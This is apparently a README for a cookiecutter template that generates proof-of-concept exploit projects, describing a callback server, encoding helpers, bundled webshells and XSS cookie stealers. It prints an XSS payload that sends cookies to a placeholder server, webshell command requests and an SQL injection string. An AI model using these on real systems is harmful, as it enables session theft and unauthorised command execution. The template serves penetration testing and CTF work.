# Cookiecutter POC Template

A minimal Python cookiecutter template for quickly creating Proof of Concept (POC) exploits and security tools. Built for speed and simplicity - no unnecessary complexity.

## Features

- **Minimal structure** - Just what you need for POCs
- **Built-in HTTP server** - Log callbacks and serve payloads
- **Utility modules** - Common encoding, timing, process execution helpers
- **Ready-to-use shells** - Command execution webshells for multiple platforms
- **XSS payloads** - Pre-built cookie stealers and data exfiltration
- **Simple CLI** - Argparse-based, no external dependencies
- **Colored output** - Clean status messages with colorama
- **KISS principle** - Keep It Simple, Stupid

## Installation

### Prerequisites

- Python 3.14+
- [uv](https://github.com/astral-sh/uv) (recommended) or pip

### Using the Template

```bash
# With uv (recommended)
uvx cookiecutter https://github.com/kwkeefer/cookiecutter-poc-uv

# Or with pip
pip install cookiecutter
cookiecutter https://github.com/kwkeefer/cookiecutter-poc-uv

# From local clone
cookiecutter /path/to/cookiecutter-poc-uv
```

You'll be prompted for:
- `project_name`: Name of your POC (e.g., "CVE-2024-1234 POC")
- `target_url`: Default target URL

## Generated Project Structure

```
your-poc/
├── src/poc/              # Your exploit code
│   ├── exploit.py        # Main exploit logic
│   ├── cli.py            # CLI interface
│   └── utils/            # Helper utilities
│       ├── encoding.py   # Base64, URL, hex encoding/decoding
│       ├── timing.py     # Timestamp generation and timing utilities
│       ├── process.py    # Execute binaries and commands
│       └── output.py     # Colored console output
├── payloads/             # Payloads to serve
│   ├── xss/              # XSS payloads and examples
│   │   ├── examples.txt  # Copy-paste XSS payloads
│   │   ├── steal-cookie.js
│   │   └── steal-all.js
│   └── shells/           # Webshells
│       ├── cmd.jsp       # JSP command shell
│       ├── cmd.aspx      # ASPX command shell
│       └── cmd.php       # PHP command shell
├── servers/              # HTTP server
│   └── server.py         # Log collector & file server
├── logs/                 # Server logs (*.ndjson)
├── pyproject.toml        # Dependencies
└── Makefile              # Setup commands
```

## Quick Start

After generating your project:

### Setup with uv (Recommended)

```bash
cd your-poc
make dev                          # Install dependencies
uv run your-poc --help           # Show help
uv run your-poc --server         # Start callback server (port 8000)
uv run your-poc -t http://target # Run exploit
```

### Setup with pip/venv

```bash
cd your-poc
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -e .
your-poc --help
```

## Included Utilities

### Encoding (`utils/encoding.py`)
```python
from poc.utils.encoding import base64_encode, url_encode, hex_encode

payload = base64_encode("admin' OR '1'='1")
escaped = url_encode("<script>alert(1)</script>")
```

### Timing (`utils/timing.py`)
```python
from poc.utils.timing import time_ms, epoch_range, identify_timestamp

# Get current timestamp in milliseconds
ts = time_ms()

# Generate timestamps for brute forcing
timestamps = epoch_range("2024-01-01 00:00:00", "2024-01-01 01:00:00")

# Identify unknown timestamp format
info = identify_timestamp("1735689600000")
print(info['type'])  # "epoch_milliseconds"
```

### Process Execution (`utils/process.py`)
```python
from poc.utils.process import run

# Run command
stdout, stderr, code = run("./exploit target.com")

# Send input
stdout, stderr, code = run("./vulnerable", input_data=payload)
```

### Colored Output (`utils/output.py`)
```python
from poc.utils.output import out

out.success("Target is vulnerable!")
out.error("Connection failed")
out.info("Starting exploit")
out.warning("This might take a while")
```

## Usage Guide

### 1. Write Your Exploit

Edit `src/poc/exploit.py`:

```python
from poc.utils.output import out

def run(args):
    target = args.target.rstrip('/')

    out.info("Checking target...")
    response = requests.get(f"{target}/vulnerable", verify=False)

    if "success" in response.text:
        out.success("Exploited successfully!")
```

### 2. Start Callback Server

```bash
# Start server to log callbacks
uv run your-poc --server

# Or run directly
uv run python servers/server.py -p 8080
```

The server:
- Serves files from `payloads/` directory
- Logs ALL requests to `logs/server.ndjson`
- Supports CORS for XSS testing

### 3. Use Included Payloads

XSS payloads in `payloads/xss/examples.txt`:
```html
<img src=x onerror="fetch('http://YOUR-SERVER:8000/xss?c='+btoa(document.cookie))">
```

Webshells work consistently across platforms:
```python
# All shells use same interface
requests.get("http://target/cmd.jsp?cmd=whoami")
requests.get("http://target/cmd.aspx?cmd=whoami")
requests.get("http://target/cmd.php?cmd=whoami")
```

### 4. Check Logs

```bash
# Watch logs in real-time
tail -f logs/server.ndjson | jq .

# Search for specific callbacks
grep "blind" logs/server.ndjson | jq .
```

## Philosophy

This template follows the KISS principle:
- One file for your exploit
- One server that does everything
- Minimal dependencies
- No complex abstractions
- Fast iteration over perfection

Perfect for:
- CTF challenges
- Bug bounty POCs
- Security research
- Quick vulnerability demos
- Penetration testing

## License

MIT